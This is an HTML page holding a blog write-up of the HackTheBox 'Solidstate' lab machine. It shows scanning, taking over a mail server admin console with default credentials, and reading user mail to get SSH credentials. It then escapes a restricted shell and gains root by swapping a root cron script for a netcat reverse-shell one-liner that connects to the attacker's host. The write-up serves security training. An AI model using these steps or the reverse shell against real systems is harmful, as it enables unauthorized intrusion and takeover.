@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Solidstate | Initial nmap root@SittingDucks:~# nmap -p- -sV 10.10.10.51 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-21 04:22 GMT Nmap scan report...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Solidstate</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-01-21 04:33:00+00:00">Tue 21 January 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Solidstate.html">Solidstate</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Solidstate.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1 id="initial-nmap">Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -p- -sV <span class="m">10</span>.10.10.51
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-21 04:22 GMT</span>
+<span class="go">Nmap scan report for 10.10.10.51</span>
+<span class="go">Host is up (0.017s latency).</span>
+<span class="go">Not shown: 65529 closed ports</span>
+<span class="go">PORT     STATE SERVICE     VERSION</span>
+<span class="go">22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span>
+<span class="go">25/tcp   open  smtp        JAMES smtpd 2.3.2</span>
+<span class="go">80/tcp   open  http        Apache httpd 2.4.25 ((Debian))</span>
+<span class="go">110/tcp  open  pop3        JAMES pop3d 2.3.2</span>
+<span class="go">119/tcp  open  nntp        JAMES nntpd (posting ok)</span>
+<span class="go">4555/tcp open  james-admin JAMES Remote Admin 2.3.2</span>
+<span class="go">Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 28.37 seconds</span>
+</pre></div>
+
+
+<p>I launch gobuster on the webserver and found the following directories:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> gobuster dir -u http://solidstate.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">5</span> 
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://solidstate.htb</span>
+<span class="go">[+] Threads:        5</span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/01/21 04:43:14 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/images (Status: 301)</span>
+<span class="go">/assets (Status: 301)</span>
+<span class="go">/server-status (Status: 403)</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/01/21 04:53:37 Finished</span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>I had a look inside but found nothing useful. I then decided to look for exploits fot the James smpt server</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> searchsploit james
+<span class="go">----------------------------------------------------- ----------------------------------------</span>
+<span class="go"> Exploit Title                                       |  Path</span>
+<span class="go">                                                     | (/usr/share/exploitdb/)</span>
+<span class="go">----------------------------------------------------- ----------------------------------------</span>
+<span class="go">Apache James Server 2.2 - SMTP Denial of Service     | exploits/multiple/dos/27915.pl</span>
+<span class="go">Apache James Server 2.3.2 - Remote Command Execution | exploits/linux/remote/35513.py</span>
+<span class="go">WheresJames Webcam Publisher Beta 2.0.0014 - Remote  | exploits/windows/remote/944.c</span>
+<span class="go">----------------------------------------------------- ----------------------------------------</span>
+<span class="go">Shellcodes: No Result</span>
+</pre></div>
+
+
+<p>Exploit 35513, which is also available here https://www.exploit-db.com/exploits/35513, is related to our version. The exploit would basically create a new user and enqueues a payload to be executed the next
+time a user logs in to the machine. In oder to do this the James server must have the default configuration which uses the default credentials root:root (username:password), unless of course you bruteforce it and get the non-default credentials. As I mentioned, the exploit requires someone to login in the box for the payload to be triggered. Since we don't have access to the box yet let's see if James uses the default credentials and if we can spot something useful. I see the exploit uses port 4555 to connect so I do the same:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc <span class="m">10</span>.10.10.51 <span class="m">4555</span>
+<span class="go">JAMES Remote Administration Tool 2.3.2</span>
+<span class="go">Please enter your login and password</span>
+<span class="go">Login id:</span>
+<span class="go">root</span>
+<span class="go">Password:</span>
+<span class="go">root</span>
+<span class="go">Welcome root. HELP for a list of commands</span>
+</pre></div>
+
+
+<p>Cool, the default credentials worked! The HELP command comes handy here as it shows me the commands I can run. </p>
+<div class="highlight"><pre><span></span><span class="go">listusers</span>
+<span class="go">Existing accounts 6</span>
+<span class="go">user: james</span>
+<span class="go">user: thomas</span>
+<span class="go">user: john</span>
+<span class="go">user: mindy</span>
+<span class="go">user: mailadmin</span>
+<span class="go">user: test</span>
+</pre></div>
+
+
+<p>Since we are root we can reset the password for all these users so that we can read the emails. Of course, I did it for all the users starting from the top but for the sake of brevity I will only report <strong>mindy</strong> here since it's the only user I found useful info for.</p>
+<div class="highlight"><pre><span></span><span class="go">setpassword mindy mindy      </span>
+<span class="go">Password for mindy reset</span>
+</pre></div>
+
+
+<p>Then I connect on the POP3 port 110 to read the emails</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> telnet <span class="m">10</span>.10.10.51 <span class="m">110</span>
+<span class="go">Trying 10.10.10.51...</span>
+<span class="go">Connected to 10.10.10.51.</span>
+<span class="go">Escape character is &#39;^]&#39;.</span>
+<span class="go">+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready </span>
+<span class="go">user mindy</span>
+<span class="go">+OK</span>
+<span class="go">pass mindy</span>
+<span class="go">+OK Welcome mindy</span>
+<span class="go">list</span>
+<span class="go">+OK 2 1945</span>
+<span class="go">1 1109</span>
+<span class="go">2 836</span>
+<span class="go">.</span>
+<span class="go">retr 2                                                                                                                                                                                        </span>
+<span class="go">+OK Message follows                                                                                                                                                                           </span>
+<span class="go">Return-Path: &lt;mailadmin@localhost&gt;                                                                                                                                                            </span>
+<span class="go">Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;                                                                                                                               </span>
+<span class="go">MIME-Version: 1.0                                                                                                                                                                             </span>
+<span class="go">Content-Type: text/plain; charset=us-ascii                                                                                                                                                    </span>
+<span class="go">Content-Transfer-Encoding: 7bit                                                                                                                                                               </span>
+<span class="go">Delivered-To: mindy@localhost                                                                                                                                                                 </span>
+<span class="go">Received: from 192.168.11.142 ([192.168.11.142])                                                                                                                                              </span>
+<span class="go">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581                                                                                                                            </span>
+<span class="go">          for &lt;mindy@localhost&gt;;                                                                                                                                                              </span>
+<span class="go">          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)                                                                                                                                               </span>
+<span class="go">Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)                                                                                                                                                   </span>
+<span class="go">From: mailadmin@localhost                                                                                                                                                                     </span>
+<span class="go">Subject: Your Access                                                                                                                                                                          </span>
+
+<span class="go">Dear Mindy,                                                                                                                                                                                   </span>
+
+
+<span class="go">Here are your ssh credentials to access the system. Remember to reset your password after your first login.                                                                                   </span>
+<span class="go">Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.                                                                          </span>
+
+<span class="go">username: mindy                                                                                                                                                                               </span>
+<span class="go">pass: P@55W0rd1!2@                                                                                                                                                                            </span>
+
+<span class="go">Respectfully,                                                                                                                                                                                 </span>
+<span class="go">James                                                                                                                                                                                         </span>
+
+<span class="go">.         </span>
+</pre></div>
+
+
+<p>We can see there are two messages. The second message contains SSH credentials we can potentially use to login to the box.</p>
+<div class="highlight"><pre><span></span><span class="gp">mindy@solidstate:~$</span> ls -l
+<span class="go">total 8</span>
+<span class="go">drwxr-x--- 2 mindy mindy 4096 Aug 22  2017 bin</span>
+<span class="go">-rw------- 1 mindy mindy   33 Sep  8  2017 user.txt</span>
+</pre></div>
+
+
+<p>Indeed I was able to login and read the user.txt file. Now I wanted to look around but I get this message when I try to change directory:</p>
+<div class="highlight"><pre><span></span><span class="gp">mindy@solidstate:~$</span> <span class="nb">cd</span> /
+<span class="go">-rbash: cd: restricted</span>
+</pre></div>
+
+
+<p>We are logged in on a <a href="https://www.tecmint.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/">restricted shell</a> which does not allow us to do much.</p>
+<p>To bypass this, I logged off and logged back in again specifying the bash shell in the ssh command:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> ssh mindy@10.10.10.51 -t bash
+<span class="go">mindy@10.10.10.51&#39;s password: </span>
+<span class="gp">$</span><span class="o">{</span>debian_chroot:+<span class="o">(</span><span class="nv">$debian_chroot</span><span class="o">)}</span>mindy@solidstate:~$ <span class="nb">cd</span> /
+<span class="gp">$</span><span class="o">{</span>debian_chroot:+<span class="o">(</span><span class="nv">$debian_chroot</span><span class="o">)}</span>mindy@solidstate:/$ ls -l
+<span class="go">total 80</span>
+<span class="go">drwxr-xr-x   2 root root  4096 Aug 22  2017 bin </span>
+<span class="go">drwxr-xr-x   3 root root  4096 Aug 22  2017 boot</span>
+<span class="go">drwxr-xr-x  17 root root  3040 Jan 20 23:11 dev </span>
+<span class="go">drwxr-xr-x 121 root root 12288 Aug 27  2017 etc </span>
+<span class="go">drwxr-xr-x   4 root root  4096 Aug 22  2017 home</span>
+<span class="go">lrwxrwxrwx   1 root root    31 Jun 18  2017 initrd.images -&gt; boot/initrd.images-4.9.0-3-686-pae</span>
+<span class="go">lrwxrwxrwx   1 root root    31 Jun 18  2017 initrd.images.old -&gt; boot/initrd.images-4.9.0-3-686-pae</span>
+<span class="go">drwxr-xr-x  16 root root  4096 Aug 22  2017 lib </span>
+<span class="go">drwx------   2 root root 16384 Jun 18  2017 lost+found</span>
+<span class="go">drwxr-xr-x   3 root root  4096 Jun 18  2017 media</span>
+<span class="go">drwxr-xr-x   2 root root  4096 Jun 18  2017 mnt </span>
+<span class="go">drwxr-xr-x   3 root root  4096 Aug 22  2017 opt </span>
+<span class="go">dr-xr-xr-x 108 root root     0 Jan 20 23:11 proc</span>
+<span class="go">drwx------   8 root root  4096 Sep  8  2017 root</span>
+<span class="go">drwxr-xr-x  21 root root   640 Jan 21 01:57 run </span>
+<span class="go">drwxr-xr-x   2 root root  4096 Aug 22  2017 sbin</span>
+<span class="go">drwxr-xr-x   2 root root  4096 Jun 18  2017 srv </span>
+<span class="go">dr-xr-xr-x  13 root root     0 Jan 20 23:11 sys </span>
+<span class="go">drwxrwxrwt   7 root root  4096 Jan 21 01:57 tmp </span>
+<span class="go">drwxr-xr-x  10 root root  4096 Jun 18  2017 usr </span>
+<span class="go">drwxr-xr-x  12 root root  4096 Aug 22  2017 var </span>
+<span class="go">lrwxrwxrwx   1 root root    28 Jun 18  2017 vmlinuz -&gt; boot/vmlinuz-4.9.0-3-686-pae</span>
+<span class="go">lrwxrwxrwx   1 root root    28 Jun 18  2017 vmlinuz.old -&gt; boot/vmlinuz-4.9.0-3-686-pae</span>
+</pre></div>
+
+
+<p>Now I am out of the restricted shell, as shown above I can change directories.</p>
+<p>At this stage I decided to download and run a linux enumeration script dubbed <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">LinuxSmartEnumeration</a> (sle) to see if it can give us some hints. </p>
+<p>After careful inspection I noticed this bit:</p>
+<div class="highlight"><pre><span></span><span class="go">============================================================( file system )=====                                                                                                              </span>
+<span class="go">[*] fst000 Writable files outside user&#39;s home.............................. yes!                                                                                                              </span>
+<span class="go">---                                                                                                                                                                                           </span>
+<span class="go">/var/tmp                                                                                                                                                                                      </span>
+<span class="go">/opt/tmp.py                                                                                                                                                                                   </span>
+<span class="go">/tmp                                                                                                                                                                                          </span>
+<span class="go">/tmp/.X11-unix                                                                                                                                                                                </span>
+<span class="go">/tmp/.XIM-unix                                                                                                                                                                                </span>
+<span class="go">/tmp/.font-unix                                                                                                                                                                               </span>
+<span class="go">/tmp/.ICE-unix                                                                                                                                                                                </span>
+<span class="go">/tmp/.ICE-unix/645                                                                                                                                                                            </span>
+<span class="go">/tmp/.Test-unix                                                                                                                                                                               </span>
+<span class="go">---                                                                           </span>
+</pre></div>
+
+
+<p>The python script /opt/tmp.py contains the following code:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="k">try</span><span class="p">:</span>
+     <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -r /tmp/* &#39;</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</pre></div>
+
+
+<p>Usually these kind of scripts runs at regular intervals to make sure the directory is clean. However, if we find a cronjob we need to hope the interval is not too long.</p>
+<p>The global crontab file does not contain anything related to tmp.py so the only other place where the cron job could be present is root's private cron file, /var/spool/cron/crontabs/root.</p>
+<p>Obviously we don't have access to that file so I created a file in the /tmp directory. After a couple of minutes I noticed the file disappeared so we are in a very good position because we can modify that file and place a shell in there. </p>
+<p>All I have to do it to replace the command </p>
+<h3 id="rm-r-tmp">'rm -r /tmp/* '</h3>
+<p>with the following shell I got from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey shell cheatsheet</a>:</p>
+<h3 id="rm-tmpfmkfifo-tmpfcat-tmpfbinsh-i-21nc-1010142-1234-tmpf">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 1234 &gt;/tmp/f')</h3>
+<p>So I modified the tmp.py by replacing the command and started a netcat listener on my kali box listening on port 1234. After waiting a couple of minutes we finally get the shell:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">1234</span>
+<span class="go">listening on [any] 1234 ...</span>
+<span class="go">connect to [10.10.14.2] from (UNKNOWN) [10.10.10.51] 36004</span>
+<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="gp">#</span> cat root.txt
+<span class="go">b4############################c9</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Solidstate.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Solidstate"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
